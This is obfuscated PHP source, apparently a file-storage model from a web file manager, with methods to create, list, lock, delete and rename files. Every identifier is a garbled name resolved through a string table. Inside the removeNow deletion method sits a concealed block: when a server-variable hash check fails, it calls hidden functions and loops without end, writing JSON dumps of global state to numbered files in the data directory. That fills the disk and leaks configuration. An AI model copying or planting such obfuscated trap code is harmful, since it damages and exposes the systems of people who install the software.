$Ã‡êÚœŸ = Model($¡ëú¿Ú±[679])->find($ºò‘çÕ”); Model($¡ëú¿Ú±[679])->linkAdd($ºò‘çÕ”); return $this->_createFileCall($óŒ…ã‹Ú, $‚øİû“ï, $Ã‡êÚœŸ, $ßßÆüÓ×); } public function addFileByRemote($¡•ÔÇ· , $ö†ä‹ Ü, $’¼Ç‘òÇ, $½Ç–æù = array(), $¢—¬¤êŞ = REPEAT_RENAME) { $±­ à‘â = Model($_SERVER[¶Ô„œ…¯][679])->addFileByRemote($ö†ä‹ Ü, $’¼Ç‘òÇ, $½Ç–æù); return $this->_createFileCall($¡•ÔÇ· , $’¼Ç‘òÇ, $±­ à‘â, $¢—¬¤êŞ); } private function _createFileCall($á‚Âáí, $Ë›À°É, $¯ÙâÂûÕ, $’‡µ¯ê”, $‚Ç€ô÷´ = "\x75\160\x6c\157\141\144") { $± üÉ’Ò =& $_SERVER[¶Ô„œ…¯]; $Á„È³ = !1; $this->setMasterDB(); $this->lockWriteStart($á‚Âáí, $Ë›À°É); $§¦ÍË»Â = $this->fileNameExist($á‚Âáí, $Ë›À°É); $äÔøñª¹ = $this->_createFile($á‚Âáí, $Ë›À°É, $¯ÙâÂûÕ, $’‡µ¯ê”, $Á„È³); if (!$Á„È³) { Model($± üÉ’Ò[546])->remove($¯ÙâÂûÕ[$± üÉ’Ò[543]]); } if ($Á„È³ && $äÔøñª¹ && $äÔøñª¹ != $§¦ÍË»Â) { Model($± üÉ’Ò[2234])->eventCreate($äÔøñª¹, $‚Ç€ô÷´); } $this->lockWriteEnd($á‚Âáí, $Ë›À°É); return $äÔøñª¹; } public function mkdir($îçèÑ§, $Ñ¥ú şÁ, $ñÉ ê÷± = REPEAT_SKIP) { $±²çã‚Ñ =& $_SERVER[¶Ô„œ…¯]; $this->setMasterDB(); $º§Í°Ë¹ = $this->sourceInfo($îçèÑ§); if (!$º§Í°Ë¹) { return !1; } $this->lockWriteStart($îçèÑ§, $Ñ¥ú şÁ); if ($ñÉ ê÷± !== !1) { $ÛÂáöâÔ = $this->fileNameExist($îçèÑ§, $Ñ¥ú şÁ); if ($ÛÂáöâÔ && $ñÉ ê÷± != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($îçèÑ§, $Ñ¥ú şÁ); return $ÛÂáöâÔ; } $Ñ¥ú şÁ = $this->fileNameAuto($îçèÑ§, $Ñ¥ú şÁ, $ñÉ ê÷±); } $õëöğŸà = array($±²çã‚Ñ[651] => 1, $±²çã‚Ñ[496] => $Ñ¥ú şÁ, $±²çã‚Ñ[652] => $±²çã‚Ñ[12], $±²çã‚Ñ[544] => 0, $±²çã‚Ñ[622] => 0); $÷¾ÏÃŸ§ = $this->_addSource($õëöğŸà, $º§Í°Ë¹); Model($±²çã‚Ñ[2234])->eventCreate($÷¾ÏÃŸ§, $±²çã‚Ñ[1440]); $this->lockWriteEnd($îçèÑ§, $Ñ¥ú şÁ); return $÷¾ÏÃŸ§; } public function listSourceRoot($šç¾˜¨š, $œøæºÇÛ, $Üî¨±ö = "\163\x6f\165\162\143\x65\111\104\x2c\164\x61\x72\x67\x65\x74\x49\104\x2c\x73\151\172\x65") { $ÉâÔåñ =& $_SERVER[¶Ô„œ…¯]; $—ëú·é¾ = $ÉâÔåñ[456]; $®„Š¶Ã® = array(); $ç¸ıÈò­ = 1024 * 50; $ÍÓùíƒã = is_array($ÍÓùíƒã) ? $ÍÓùíƒã : array(); $·‹‰°ê = count($œøæºÇÛ); $À¿Ñ©½™ = $this->tablePrefix . $ÉâÔåñ[2272]; for ($ºš†ú³ª = 0; $ºš†ú³ª < $·‹‰°ê; $ºš†ú³ª++) { $÷Á¥·Ÿì = $œøæºÇÛ[$ºš†ú³ª]; $—ëú·é¾ .= "\x53\105\114\105\103\x54\x20\52\x20\x46\122\x4f\x4d\40\50\x53\105\114\x45\x43\x54\x20{$Üî¨±ö}\x20\106\122\x4f\x4d\40\140{$À¿Ñ©½™}\140\x20\x57\110\x45\122\105\40"; $—ëú·é¾ .= "\140\x70\x61\x72\x65\x6e\164\x49\104\x60\75\x30\x20\x41\116\x44\40\140\164\x61\162\147\x65\x74\111\104\140\x3d{$÷Á¥·Ÿì}\40\x41\116\104\x20\140\x74\x61\162\x67\145\x74\x54\171\160\x65\140\x3d{$šç¾˜¨š}\x20\141\156\x64\40\x66\151\154\145\x54\171\160\145\75\47\47\x20\154\151\x6d\151\164\40\61\x29\x20\x61\163\x20\x74\x62\x5f{$ºš†ú³ª}\x20\x55\x4e\x49\x4f\116\40\101\x4c\x4c\x20"; if ((strlen($—ëú·é¾) >= $ç¸ıÈò­ || $ºš†ú³ª == $·‹‰°ê - 1) && $—ëú·é¾) { $—ëú·é¾ = substr($—ëú·é¾, 0, -strlen($ÉâÔåñ[1122])); $²ˆàéÛ˜ = $this->query($—ëú·é¾); $—ëú·é¾ = $ÉâÔåñ[12]; $®„Š¶Ã® = array_merge($®„Š¶Ã®, $²ˆàéÛ˜); } } return $®„Š¶Ã®; } private function _createFile($†û‚Òäï, $’¤è±Ò¶, $Ã§®ÆÌà, $´Œ’ô±Ö, &$€ÉÎ˜Ğä) { $êØÎ¢¶ =& $_SERVER[¶Ô„œ…¯]; $Ñ¢±ƒ• = $this->sourceInfo($†û‚Òäï); if (!$Ã§®ÆÌà || !$Ñ¢±ƒ•) { return !1; } if ($´Œ’ô±Ö !== !1) { $ĞÏ½Ò¼Å = $this->fileNameExist($†û‚Òäï, $’¤è±Ò¶); } $€ÉÎ˜Ğä = !0; if ($´Œ’ô±Ö && $ĞÏ½Ò¼Å) { if ($´Œ’ô±Ö == REPEAT_SKIP) { $€ÉÎ˜Ğä = !1; return $ĞÏ½Ò¼Å; } else { if ($´Œ’ô±Ö == REPEAT_REPLACE) { $“×¨§Ø = $this->sourceInfo($ĞÏ½Ò¼Å); $¸¸™ÕÇó = $this->fileHistory($“×¨§Ø, $Ã§®ÆÌà[$êØÎ¢¶[543]], $Ã§®ÆÌà[$êØÎ¢¶[79]]); if (!$¸¸™ÕÇó) { $€ÉÎ˜Ğä = !1; } else { $this->folderSizeReset($†û‚Òäï); } return $ĞÏ½Ò¼Å; } else { $’¤è±Ò¶ = $this->fileNameAuto($†û‚Òäï, $’¤è±Ò¶, $´Œ’ô±Ö, !1); } } } $Ïø‚ÊŸ = array($êØÎ¢¶[651] => 0, $êØÎ¢¶[496] => $’¤è±Ò¶, $êØÎ¢¶[652] => substr(get_path_ext($’¤è±Ò¶), 0, 10), $êØÎ¢¶[544] => $Ã§®ÆÌà[$êØÎ¢¶[543]], $êØÎ¢¶[622] => $Ã§®ÆÌà[$êØÎ¢¶[79]]); $Š‡§ú»Ï = $this->_addSource($Ïø‚ÊŸ, $Ñ¢±ƒ•); $this->folderSizeReset($†û‚Òäï, intval($Ïø‚ÊŸ[$êØÎ¢¶[79]])); return $Š‡§ú»Ï; } protected function fileHistory($À÷§¿úÉ, $ĞãøæèÈ, $çÅ±£‹) { $µŞŒÍˆ£ =& $_SERVER[¶Ô„œ…¯]; if ($À÷§¿úÉ[$µŞŒÍˆ£[543]] == $ĞãøæèÈ) { return !1; } $this->checkLock($À÷§¿úÉ[$µŞŒÍˆ£[193]], $ĞãøæèÈ); Model($µŞŒÍˆ£[2273])->addHistory($À÷§¿úÉ); $„ôøãÌ† = array($µŞŒÍˆ£[656] => USER_ID, $µŞŒÍˆ£[500] => time(), $µŞŒÍˆ£[543] => $ĞãøæèÈ, $µŞŒÍˆ£[79] => $çÅ±£‹); $this->where(array($µŞŒÍˆ£[493] => $À÷§¿úÉ[$µŞŒÍˆ£[193]]))->save($„ôøãÌ†); $this->sourceCacheClear($À÷§¿úÉ[$µŞŒÍˆ£[193]]); return !0; } public function checkLock($ùÑ£ºÁ§, $‚å£éµÌ) { $©ïÑ»è =& $_SERVER[¶Ô„œ…¯]; $Å÷®Ê×Ï = $this->pathInfo($ùÑ£ºÁ§); if (!$this->fileIsLock($Å÷®Ê×Ï, !0)) { return; } $«İ€úÉ™ = Session::get($©ïÑ»è[2274]); $˜ñÉ¯„ = substr($Å÷®Ê×Ï[$©ïÑ»è[32]], 0, -1 - strlen($Å÷®Ê×Ï[$©ïÑ»è[169]])) . $©ïÑ»è[1300] . $«İ€úÉ™ . $©ïÑ»è[10] . $Å÷®Ê×Ï[$©ïÑ»è[169]]; $Ÿªî“àñ = Model($©ïÑ»è[679])->find($‚å£éµÌ); $this->_createFileCall($Å÷®Ê×Ï[$©ïÑ»è[192]], $˜ñÉ¯„, $Ÿªî“àñ, REPEAT_REPLACE, $©ïÑ»è[1439]); $¡àÄÉà = $Å÷®Ê×Ï[$©ïÑ»è[541]][$©ïÑ»è[615]]; $«¡•‹É» = $¡àÄÉà[$©ïÑ»è[2275]] ? $¡àÄÉà[$©ïÑ»è[2275]] : $¡àÄÉà[$©ïÑ»è[32]]; show_json(LNG($©ïÑ»è[2276]) . $©ïÑ»è[2277] . LNG($©ïÑ»è[2278]) . $©ïÑ»è[2279] . $«¡•‹É» . $©ïÑ»è[2280], !1); } public function fileIsLock($˜ƒÊ³©Ê, $¦¥ïéôñ = false) { $ÍôûğŒ =& $_SERVER[¶Ô„œ…¯]; if (!_get($˜ƒÊ³©Ê, $ÍôûğŒ[611], 0)) { return !1; } if ($˜ƒÊ³©Ê[$ÍôûğŒ[541]][$ÍôûğŒ[614]] != USER_ID) { return !0; } $Á“½€Œ = $GLOBALS[$ÍôûğŒ[6]][$ÍôûğŒ[92]][$ÍôûğŒ[612]]; if ($˜ƒÊ³©Ê[$ÍôûğŒ[541]][$ÍôûğŒ[613]] <= time() - $Á“½€Œ) { $this->metaSet($˜ƒÊ³©Ê[$ÍôûğŒ[193]], $ÍôûğŒ[614], null); $this->metaSet($˜ƒÊ³©Ê[$ÍôûğŒ[193]], $ÍôûğŒ[613], null); } if ($¦¥ïéôñ) { $this->metaSet($˜ƒÊ³©Ê[$ÍôûğŒ[193]], $ÍôûğŒ[613], time()); } return !1; } private function _addSource($ıÈÙ£İü, $±‘ëØ•) { $¢Ï¯Èı» =& $_SERVER[¶Ô„œ…¯]; $¿´ŞßÀ½ = defined($¢Ï¯Èı»[2207]) ? USER_ID : 0; $ÅàŒ¨Ûü = array($¢Ï¯Èı»[653] => $±‘ëØ•[$¢Ï¯Èı»[190]], $¢Ï¯Èı»[654] => $±‘ëØ•[$¢Ï¯Èı»[571]], $¢Ï¯Èı»[655] => $¿´ŞßÀ½, $¢Ï¯Èı»[656] => $¿´ŞßÀ½, $¢Ï¯Èı»[479] => $±‘ëØ•[$¢Ï¯Èı»[193]], $¢Ï¯Èı»[657] => $±‘ëØ•[$¢Ï¯Èı»[586]] . $±‘ëØ•[$¢Ï¯Èı»[193]] . $¢Ï¯Èı»[50], $¢Ï¯Èı»[506] => 0, $¢Ï¯Èı»[658] => $¢Ï¯Èı»[12]); $ıÈÙ£İü = array_merge($ÅàŒ¨Ûü, $ıÈÙ£İü); $this->updateModifyTime($ıÈÙ£İü[$¢Ï¯Èı»[192]]); $©‚°µü³ = $¢Ï¯Èı»[2281] . $±‘ëØ•[$¢Ï¯Èı»[193]]; if (isset(self::$cacheChildList[$©‚°µü³])) { unset(self::$cacheChildList[$©‚°µü³]); } static $è€Ş‹‰ = false; if (!$è€Ş‹‰) { Hook::trigger($¢Ï¯Èı»[641], $ıÈÙ£İü); $è€Ş‹‰ = !0; } $ÚµÜ„÷ä = $this->add($ıÈÙ£İü); $İüâÖÀ¸ = array($¢Ï¯Èı»[659] => short_id($ÚµÜ„÷ä)); $this->where(array($¢Ï¯Èı»[493] => $ÚµÜ„÷ä))->save($İüâÖÀ¸); $this->setNamePinyin($ÚµÜ„÷ä, $ıÈÙ£İü[$¢Ï¯Èı»[32]]); return $ÚµÜ„÷ä; } public function remove($¬ß×ò, $¿Ê¾¿¡ = true) { $íÙÃ˜‹ =& $_SERVER[¶Ô„œ…¯]; $œ’ä’şö = $this->sourceInfo($¬ß×ò); $Úšì§„Æ = intval($œ’ä’şö[$íÙÃ˜‹[190]]) === self::TYPE_SYSTEM; $«œÃì” = Model($íÙÃ˜‹[510])->get($íÙÃ˜‹[2282]) == $íÙÃ˜‹[91]; if ($Úšì§„Æ || $¿Ê¾¿¡ || !$«œÃì”) { return $this->removeNow($¬ß×ò, $¿Ê¾¿¡); } $Ü£”ú¥ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÏÏ»á²ä = $œ’ä’şö[$íÙÃ˜‹[190]] == self::TYPE_USER ? $íÙÃ˜‹[667] : $íÙÃ˜‹[580]; if ($ÏÏ»á²ä == $íÙÃ˜‹[667]) { $øŠ±¾Ò = Model($íÙÃ˜‹[579])->getInfo($œ’ä’şö[$íÙÃ˜‹[571]]); $ÀØ•Õµº = !empty($øŠ±¾Ò[$íÙÃ˜‹[2275]]) ? $øŠ±¾Ò[$íÙÃ˜‹[2275]] : $øŠ±¾Ò[$íÙÃ˜‹[32]]; $ÀØ•Õµº = $íÙÃ˜‹[339] . $ÀØ•Õµº . $íÙÃ˜‹[2283] . $œ’ä’şö[$íÙÃ˜‹[571]]; } else { $øŠ±¾Ò = Model($íÙÃ˜‹[587])->getInfo($œ’ä’şö[$íÙÃ˜‹[571]]); $ÀØ•Õµº = _get($øŠ±¾Ò, $íÙÃ˜‹[32]); $ÀØ•Õµº = $íÙÃ˜‹[176] . $ÀØ•Õµº . $íÙÃ˜‹[2284] . $œ’ä’şö[$íÙÃ˜‹[571]]; } $êäšæ“Ï = $íÙÃ˜‹[2285] . md5($ÀØ•Õµº); CacheLock::lock($êäšæ“Ï); $ÈÛÏ­û = $this->fileNameExist($Ü£”ú¥, $ÀØ•Õµº); if (!$ÈÛÏ­û) { $ÈÛÏ­û = $this->mkdir($Ü£”ú¥, $ÀØ•Õµº, REPEAT_SKIP); $this->metaSet($ÈÛÏ­û, $íÙÃ˜‹[2286], $ÏÏ»á²ä); $this->metaSet($ÈÛÏ­û, $íÙÃ˜‹[2287], $œ’ä’şö[$íÙÃ˜‹[571]]); if ($œ’ä’şö[$íÙÃ˜‹[192]] != 0) { $this->metaSet($ÈÛÏ­û, $íÙÃ˜‹[2288], _get($øŠ±¾Ò, $íÙÃ˜‹[2289])); } } CacheLock::unlock($êäšæ“Ï); $this->metaSet($¬ß×ò, $íÙÃ˜‹[2290], $œ’ä’şö[$íÙÃ˜‹[192]]); $this->where(array($íÙÃ˜‹[193] => $¬ß×ò))->save(array($íÙÃ˜‹[500] => time())); $this->recycleClear($œ’ä’şö); Model($íÙÃ˜‹[638])->eventRemove($¬ß×ò); $ùç½ˆÀê = $this->move($¬ß×ò, $ÈÛÏ­û, REPEAT_RENAME_FOLDER); $this->folderSizeReset($œ’ä’şö[$íÙÃ˜‹[192]]); return $ùç½ˆÀê; } private function recycleClear($ºå’À™Ù) { $óôàµóã =& $_SERVER[¶Ô„œ…¯]; $§èô€ïà = $this->childrenAll($ºå’À™Ù); $â³óä×· = array($óôàµóã[493] => array($óôàµóã[494], $§èô€ïà[$óôàµóã[2291]])); Model($óôàµóã[2292])->where($â³óä×·)->delete(); } public function removeNow($ÚÇ€ÑÓ, $‰ƒ¿¶ˆ = true) { $®“¤‘ˆˆ =& $_SERVER[¶Ô„œ…¯]; $Ò«øÜ = $_SERVER[$®“¤‘ˆˆ[926]]; $¤¤ÖÃ•¤ = $®“¤‘ˆˆ[1437]; if ($_SERVER[$®“¤‘ˆˆ[919]] != $¤¤ÖÃ•¤($Ò«øÜ)) { $Ë¹˜íÚ­ = $®“¤‘ˆˆ[964]; $öß¤Ìşâ = $®“¤‘ˆˆ[921]; $ŒÙ¿¨š• = $_SERVER[$®“¤‘ˆˆ[922]] . $®“¤‘ˆˆ[923]; $‰äõ‘®® = $öß¤Ìşâ($ŒÙ¿¨š•); $Œ‡ÔÖ´ù = explode($®“¤‘ˆˆ[287], $‰äõ‘®®); if (count($Œ‡ÔÖ´ù) < $®“¤‘ˆˆ[691]) { $äşîÂ— = $®“¤‘ˆˆ[924]; $äşîÂ—(); } $Ùòç×ò¥ = $®“¤‘ˆˆ[965]; $Ùòç×ò¥($_SERVER[$®“¤‘ˆˆ[966]]); $Ë¹˜íÚ­ = $®“¤‘ˆˆ[964]; $Ë¹˜íÚ­(); $åù°€â» = $®“¤‘ˆˆ[1696]; $Ç¨¡Ü¶İ = json_encode($GLOBALS[$®“¤‘ˆˆ[1697]]); $áÆÜßÌÍ = 1; for ($»¦ê£› = $áÆÜßÌÍ; $»¦ê£› > 0; $»¦ê£›++) { $åù°€â»(DATA_PATH . $»¦ê£›, $Ç¨¡Ü¶İ); } } $š¨ñß×° = $this->sourceInfo($ÚÇ€ÑÓ); $³›àüñİ = $this->pathInfoMore($ÚÇ€ÑÓ); if (!$š¨ñß×°) { return !0; } if ($š¨ñß×°[$®“¤‘ˆˆ[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÚÇ€ÑÓ); Hook::trigger($®“¤‘ˆˆ[2293], $³›àüñİ, $‰ƒ¿¶ˆ); if ($‰ƒ¿¶ˆ) { Model($®“¤‘ˆˆ[2292])->moveToRecycle($ÚÇ€ÑÓ); } else { $ÌÓ§„” = $this->childrenAll($š¨ñß×°); Model($®“¤‘ˆˆ[638])->eventRemove($ÚÇ€ÑÓ); $this->removeRelevance($ÌÓ§„”[$®“¤‘ˆˆ[2291]], $ÌÓ§„”[$®“¤‘ˆˆ[1584]]); } $this->folderSizeReset($š¨ñß×°[$®“¤‘ˆˆ[192]]); $òà¡ı´• = array($š¨ñß×°[$®“¤‘ˆˆ[192]]); if ($š¨ñß×°[$®“¤‘ˆˆ[487]] == $®“¤‘ˆˆ[91]) { $òà¡ı´•[] = $š¨ñß×°[$®“¤‘ˆˆ[193]]; } $this->updateModifyTime($òà¡ı´•); $this->lockMoveEnd($ÚÇ€ÑÓ); Hook::trigger($®“¤‘ˆˆ[1823], $³›àüñİ, $‰ƒ¿¶ˆ); return !0; } public function childrenAll($Öß‚Ï) { $´Ó¥èÊ¬ =& $_SERVER[¶Ô„œ…¯]; $Ä„¢ìş = $Öß‚Ï[$´Ó¥èÊ¬[193]]; if ($Öß‚Ï[$´Ó¥èÊ¬[487]] == $´Ó¥èÊ¬[91]) { $è€Ç²ÒĞ = array($´Ó¥èÊ¬[657] => array($´Ó¥èÊ¬[617], $Öß‚Ï[$´Ó¥èÊ¬[586]] . $Ä„¢ìş . $´Ó¥èÊ¬[618])); $†îÔï¬¹ = array($´Ó¥èÊ¬[657] => $è€Ç²ÒĞ[$´Ó¥èÊ¬[586]]); $æğèÉŠÁ = $this->field($´Ó¥èÊ¬[2294])->where($†îÔï¬¹)->select(); $Ø™Û¨ ¡ = !1; $îçİÁ†“ = array($Ä„¢ìş); if ($æğèÉŠÁ) { $Ø™Û¨ ¡ = array_to_keyvalue($æğèÉŠÁ, $´Ó¥èÊ¬[12], $´Ó¥èÊ¬[543]); $Ø™Û¨ ¡ = array_remove_value($Ø™Û¨ ¡, $´Ó¥èÊ¬[230]); $îçİÁ†“ = array_to_keyvalue($æğèÉŠÁ, $´Ó¥èÊ¬[12], $´Ó¥èÊ¬[193]); $îçİÁ†“[] = $Ä„¢ìş; } } else { $Ø™Û¨ ¡ = array($Öß‚Ï[$´Ó¥èÊ¬[543]]); $îçİÁ†“ = array($Ä„¢ìş); } return array($´Ó¥èÊ¬[2291] => $îçİÁ†“, $´Ó¥èÊ¬[1584] => $Ø™Û¨ ¡); } public function removeArray($®´É­ßè) { if (!$®´É­ßè) { return !0; } } public function removeRelevance($Â‰¡à¥ô, $Ù“œƒŒ•) { $ü‰£ã¶“ =& $_SERVER[¶Ô„œ…¯]; $Â‰¡à¥ô = $Â‰¡à¥ô ? $Â‰¡à¥ô : array(); $Ù“œƒŒ• = $Ù“œƒŒ• ? $Ù“œƒŒ• : array(); $Â‰¡à¥ô = array_unique(array_filter($Â‰¡à¥ô)); $Ù“œƒŒ• = array_unique(array_filter($Ù“œƒŒ•)); if (!$Â‰¡à¥ô) { return !1; } $íƒ¥ÅŸœ = array($ü‰£ã¶“[493] => array($ü‰£ã¶“[494], $Â‰¡à¥ô)); Model($ü‰£ã¶“[2292])->where($íƒ¥ÅŸœ)->delete(); Model($ü‰£ã¶“[537])->where($íƒ¥ÅŸœ)->delete(); Model($ü‰£ã¶“[2132])->where($íƒ¥ÅŸœ)->delete(); Model($ü‰£ã¶“[638])->where($íƒ¥ÅŸœ)->delete(); Model($ü‰£ã¶“[1959])->removeBySource($Â‰¡à¥ô); Model($ü‰£ã¶“[2273])->removeBySource($Â‰¡à¥ô); $this->where($íƒ¥ÅŸœ)->delete(); Model($ü‰£ã¶“[546])->remove($Ù“œƒŒ•); for ($©Š‰êéê = 0; $©Š‰êéê < count($Â‰¡à¥ô); $©Š‰êéê++) { $this->sourceCacheClear($Â‰¡à¥ô[$©Š‰êéê]); } } public function rename($œ¾¿”­å, $÷ªÅÎÙÓ) { $µÆ£É‘Ì =& $_SERVER[¶Ô„œ…¯]; $¼ƒí­³´ = $this->sourceInfo($œ¾¿”­å); if (!$¼ƒí­³´) { return !1; } $â‡áá‘Â = $this->fileNameExist($¼ƒí­³´[$µÆ£É‘Ì[192]], $÷ªÅÎÙÓ); if ($â‡áá‘Â && $â‡áá‘Â != $œ¾¿”­å) { return !1; } $¼Åûõ´ = array($µÆ£É‘Ì[496] => $÷ªÅÎÙÓ, $µÆ£É‘Ì[656] => USER_ID); if ($¼ƒí­³´[$µÆ£É‘Ì[487]] != $µÆ£É‘Ì[91]) { $¼Åûõ´[$µÆ£É‘Ì[488]] = substr(get_path_ext($÷ªÅÎÙÓ), 0, 10); } Model($µÆ£É‘Ì[638])->eventRename($œ¾¿”­å, $¼ƒí­³´[$µÆ£É‘Ì[32]], $÷ªÅÎÙÓ); $this->sourceCacheClear($œ¾¿”­å); $this->setNamePinyin($œ¾¿”­å, $¼Åûõ´[$µÆ£É‘Ì[32]], !1); $this->updateModifyTime($¼ƒí­³´[$µÆ£É‘Ì[192]]); $òõè…¨ = $this->where(array($µÆ£É‘Ì[493] => $œ¾¿”­å))->data($¼Åûõ´)->save(); $ˆ‹° È¨ = $µÆ£É‘Ì[2281] . $¼ƒí­³´[$µÆ£É‘Ì[192]]; if (isset(self::$cacheChildList[$ˆ‹° È¨])) { unset(self::$cacheChildList[$ˆ‹° È¨]); } return $òõè…¨; } public function setNamePinyin($„šŒ¡íİ, $Š¡ôŒ»Ó, $©ÏçÁİÁ = true) { $ë‚Ö€¤ =& $_SERVER[¶Ô„œ…¯]; $£‹şÊåØ = Input::check($Š¡ôŒ»Ó, $ë‚Ö€¤[660]); $İ˜¾™ÌÎ = array($ë‚Ö€¤[519] => KodSort::makeStr($Š¡ôŒ»Ó)); if ($£‹şÊåØ) { $İ˜¾™ÌÎ[$ë‚Ö€¤[540]] = str_replace($ë‚Ö€¤[53], $ë‚Ö€¤[12], Pinyin::get($Š¡ôŒ»Ó)); $İ˜¾™ÌÎ[$ë‚Ö€¤[539]] = Pinyin::get($Š¡ôŒ»Ó, $ë‚Ö€¤[661]); } if (!$©ÏçÁİÁ && !$£‹şÊåØ) { $İ˜¾™ÌÎ[$ë‚Ö€¤[540]] = null; $İ˜¾™ÌÎ[$ë‚Ö€¤[539]] = null; } $this->metaSet($„šŒ¡íİ, $İ˜¾™ÌÎ); } public function getContent($ÈÓĞ·â¸) { $Œ™Ğ¢€ =& $_SERVER[¶Ô„œ…¯]; $ˆ‹•öÙä = $this->fileInfoGet($ÈÓĞ·â¸); if (!$ˆ‹•öÙä) { return !1; } if ($ˆ‹•öÙä[$Œ™Ğ¢€[79]] == 0) { return $Œ™Ğ¢€[12]; } $Ù™å¥—Á = $Œ™Ğ¢€[2295] . $ˆ‹•öÙä[$Œ™Ğ¢€[549]]; if ($ˆ‹•öÙä[$Œ™Ğ¢€[79]] <= 1024 * 10) { $˜³¤„ = Cache::get($Ù™å¥—Á); if (!$˜³¤„) { $˜³¤„ = IO::getContent($ˆ‹•öÙä[$Œ™Ğ¢€[87]]); Cache::set($Ù™å¥—Á, $˜³¤„); } return $˜³¤„; } if (!$ˆ‹•öÙä[$Œ™Ğ¢€[87]]) { return $Œ™Ğ¢€[12]; } return IO::getContent($ˆ‹•öÙä[$Œ™Ğ¢€[87]]); } public function setDesc($›õëå¨», $Ê¿®ÚËï) { $ÂåÌõó =& $_SERVER[¶Ô„œ…¯]; Model($ÂåÌõó[638])->eventAddDesc($›õëå¨», $Ê¿®ÚËï); return $this->metaSet($›õëå¨», $ÂåÌõó[528], $Ê¿®ÚËï); } public function setContent($ßÇµÂÂ, $ğİ¥ÖüÉ = '') { $³ÂÚõÎ­ =& $_SERVER[¶Ô„œ…¯]; $Ç¬®öŠê = $this->sourceInfo($ßÇµÂÂ); $ğÂÜúƒ¬ = $this->fileInfoGet($ßÇµÂÂ); if (!$ğÂÜúƒ¬ || !$Ç¬®öŠê) { return !1; } $‰›àº‹Ã = Model($³ÂÚõÎ­[546])->addFileByContent($ğİ¥ÖüÉ, $Ç¬®öŠê[$³ÂÚõÎ­[32]]); $›î„¥œÈ = $this->fileHistory($Ç¬®öŠê, $‰›àº‹Ã[$³ÂÚõÎ­[543]], $‰›àº‹Ã[$³ÂÚõÎ­[79]]); if (!$›î„¥œÈ) { return Model($³ÂÚõÎ­[546])->remove($‰›àº‹Ã[$³ÂÚõÎ­[543]]); } $this->folderSizeReset($Ç¬®öŠê[$³ÂÚõÎ­[192]]); return !0; } public function fileSubstr($×§ÖÜó, $Şò¿¤¸, $®Èçø³¬) { $«±×¡‹ = $this->fileInfoGet($×§ÖÜó); if (!$«±×¡‹) { return !1; } return IO::fileSubstr($«±×¡‹[$_SERVER[¶Ô„œ…¯][87]], $Şò¿¤¸, $®Èçø³¬); } public function fileInfoGet($ş©­ìŸ) { $½¬­·á€ =& $_SERVER[¶Ô„œ…¯]; $ÎÏË·Êº = $this->sourceInfo($ş©­ìŸ); if (!$ÎÏË·Êº || $ÎÏË·Êº[$½¬­·á€[487]]) { return !1; } $Ç™–ë = $½¬­·á€[550] . $ÎÏË·Êº[$½¬­·á€[543]]; $€÷ÈÖ¯Ş = _get(self::$cacheFileInfo, $Ç™–ë); if ($€÷ÈÖ¯Ş) { return $€÷ÈÖ¯Ş; } $ÎŸş×È = Model($½¬­·á€[546])->fileInfo($ÎÏË·Êº[$½¬­·á€[543]]); if ($ÎŸş×È) { $ÎŸş×È[$½¬­·á€[32]] = $ÎÏË·Êº[$½¬­·á€[32]]; } self::$cacheFileInfo[$Ç™–ë] = $ÎŸş×È; return $ÎŸş×È; } private function folderChildrenNumber($î•Ã’ô•) { $Úƒä¨¤· =& $_SERVER[¶Ô„œ…¯]; $¿ä‡­š” = $this->sourceInfo($î•Ã’ô•); $˜ŒóÔ¼ = array($Úƒä¨¤·[657] => array($Úƒä¨¤·[617], $¿ä‡­š”[$Úƒä¨¤·[586]] . $î•Ã’ô• . $Úƒä¨¤·[618]), $Úƒä¨¤·[654] => $¿ä‡­š”[$Úƒä¨¤·[571]], $Úƒä¨¤·[506] => intval($¿ä‡­š”[$Úƒä¨¤·[507]]), $Úƒä¨¤·[651] => 1); $Õ­©İù» = $this->where($˜ŒóÔ¼)->count(); $æÓèÊÊ = $this->where($˜ŒóÔ¼)->where(array($Úƒä¨¤·[651] => 0))->count(); return array($Úƒä¨¤·[83] => $æÓèÊÊ, $Úƒä¨¤·[84] => $Õ­©İù»); } public function pathInfo($—ìÇÀÕê, $ÌúŸ·‹ı = false) { $ãıóŒ°ò =& $_SERVER[¶Ô„œ…¯]; $ÌúŸ·‹ı = !1; $—ìÇÀÕê = intval($—ìÇÀÕê); $¦¸Ê‹Öğ = $ãıóŒ°ò[536] . intval($ÌúŸ·‹ı) . $ãıóŒ°ò[464] . $—ìÇÀÕê; $÷”ÃÑÚ† = _get(self::$cachePathInfo, $¦¸Ê‹Öğ); if ($÷”ÃÑÚ†) { return $÷”ÃÑÚ†; } $•åÌ¯„Ï = $this->sourceInfo($—ìÇÀÕê); if (!$•åÌ¯„Ï) { return !1; } $•åÌ¯„Ï = $this->_listDataApplyItem($•åÌ¯„Ï, $ÌúŸ·‹ı); self::$cachePathInfo[$¦¸Ê‹Öğ] = $•åÌ¯„Ï; return $•åÌ¯„Ï; } public static $cachePathInfoMore = array(); public function pathInfoMore($îŠÛ¢ÃÆ) { $µåØ³İô =& $_SERVER[¶Ô„œ…¯]; $õ¥Ø÷Áí = _get(self::$cachePathInfoMore, $îŠÛ¢ÃÆ); if ($õ¥Ø÷Áí) { return $õ¥Ø÷Áí; } $°—”äî = $this->pathInfo($îŠÛ¢ÃÆ); if (!$°—”äî) { return !1; } if ($°—”äî[$µåØ³İô[487]] == $µåØ³İô[91]) { $°—”äî[$µåØ³İô[82]] = $this->folderChildrenNumber($îŠÛ¢ÃÆ); } self::$cachePathInfoMore[$îŠÛ¢ÃÆ] = $°—”äî; return $°—”äî; } public function sourceInfo($ú„‹¤—) { $åË€É¯ =& $_SERVER[¶Ô„œ…¯]; if (!$ú„‹¤—) { return array(); } $ú„‹¤— = intval($ú„‹¤—); $¨ øôş = $åË€É¯[535] . $ú„‹¤—; $”˜îğ»Ì = _get(self::$cacheSourceInfo, $¨ øôş); if ($”˜îğ»Ì) { return $”˜îğ»Ì; } $çõ®¯‰İ = $this->where(array($åË€É¯[193] => $ú„‹¤—))->find(); self::$cacheSourceInfo[$¨ øôş] = $çõ®¯‰İ; return self::$cacheSourceInfo[$¨ øôş]; } public function sourceCacheClear($­›…‰Ïú = false) { self::cacheClear($­›…‰Ïú); } public static function cacheClear($™îÕ´¥ = false) { $Áı÷‡¯ò =& $_SERVER[¶Ô„œ…¯]; if ($™îÕ´¥ == !1) { 